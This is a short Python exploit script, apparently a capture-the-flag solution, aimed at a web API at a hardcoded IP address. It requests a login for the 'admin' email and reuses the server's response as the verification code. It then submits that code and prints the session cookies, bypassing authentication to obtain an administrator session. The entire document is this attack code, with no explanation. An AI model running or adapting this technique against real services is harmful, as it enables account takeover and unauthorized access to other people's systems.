#!/usr/bin/env python3
import requests
import sys

BASE_URL = 'http://35.207.189.79/api/'
resp = requests.post(BASE_URL + 'login', json={'email': 'admin'})
if resp.status_code != 200:
    print(resp.text)
    sys.exit(1)
resp = requests.post(BASE_URL + 'verify', json={'code': resp.text})
if resp.status_code != 200:
    print(resp.text)
    sys.exit(1)
print(resp.cookies)
